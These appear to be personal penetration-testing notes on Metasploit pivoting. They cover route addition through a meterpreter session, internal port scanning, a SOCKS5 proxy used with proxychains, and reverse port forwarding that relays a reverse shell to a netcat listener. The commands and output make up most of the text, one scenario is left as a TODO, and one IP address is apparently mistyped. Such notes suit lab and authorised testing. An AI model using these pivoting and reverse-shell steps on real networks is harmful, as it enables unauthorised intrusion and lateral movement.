# Metasploit Port Tunneling for exploitation

## Scenario 1: 
- The service of my target machine (10.10.1.10) is serving only at lo interface at 127.0.0.1:3306. It does not serve at 0.0.0.0:3306.
- I have an active meterpreter session for this machine.

Technique: Local Port Forwarding via meterpreter portfwd

(TODO)

## Scenario 2: 
- I have exploited a machine (10.10.1.10) that has access to another internal admin network on another network interface eth2 (172.16.1.10).
- I would like to perform port scanning on the intranet network.

Technique: Add Route, Add Socks proxy

```sh
msf6 > sessions

Active sessions
===============

  Id  Name  Type                   Information          Connection
  --  ----  ----                   -----------          ----------
  1         shell linux            SSH root @           10.10.1.32:35981 -> 10.10.1.10:22 (10.10.1.10)
  2         meterpreter x86/linux  root @ 172.16.1.100  10.10.1.32:4433 -> 10.10.1.10:43318 (10.10.1.10)
  
msf6 > route add 172.16.1.0/24 255.255.255.0 2
[*] Route added

msf6 > route get 172.16.1.2
172.16.1.2 routes through: Session 2
```
My active meterpreter session is at SESSION 2. Add a route with the following format: `route add <IP/CIDR> <SUBNET> <SESSION>`. 
Performing this will allow you to use metasploit modules to port scan the intranet network.

```
msf6 > use auxiliary/scanner/portscan/tcp 
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.1.2
RHOSTS => 172.16.1.2
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 80
PORTS => 80
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 172.16.1.2:           - 172.16.1.2:80 - TCP OPEN
[*] 172.16.1.2:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
We can see perform port scan via metasploit module. However, we can further expand this to tools outside of metasploit by setting up a SOCKs proxy.

```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 1.
[*] Starting the SOCKS proxy server
```
We set up a SOCK5 proxy and configure our `proxychains.conf` to use 127.0.0.1:9050.

```
(host)# proxychains curl -v http://172.16.1.2/ 
ProxyChains-3.1 (http://proxychains.sf.net)
*   Trying 172.16.1.2:80...
* Connected to 172.16.1.2 (127.0.0.1) port 80 (#0)
...
```
We have more flexibility with what tools to use with this Socks proxy set up. 

## Scenario 3:
- I have gained access to intranet admin web portal (172.16.1.2:80) via my exploited jump host (10.10.1.10 or 172.16.1.10) via Scenario 2.
- I found a vulnerability on 172.16.1.2:80
- I want to get a reverse connection back to my host machine (10.10.1.32) via tunneling through jump host at 172.16.1.10:4444.

Technique: portfwd reverse forwarding

```
msf6 post(multi/manage/sudo) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > portfwd list

No port forwards are currently active.

meterpreter > portfwd add -R -L 10.10.1.32 -l 4443 -p 4444
[*] Reverse TCP relay created: (remote) :4444 -> (local) 10.10.1.32:4443

meterpreter > background

(host)# nc -nlvp 4443
```
portfwd is a meterpreter feature that supports relaying. We specify `-R` for reverse relaying. The `-L` option is the IP of host machine and `-l` is our netcat listener while `-p` will open a listening port on our jump host at `0.0.0.0:4444`.

```
(host)# proxychains exploit.sh --lhost=172.16.1.10 --lport=4444
```
We trigger our reverse shell to connect to our jumphost at 172.16.1.0:4444 which will get relayed back to our host's netcat. 

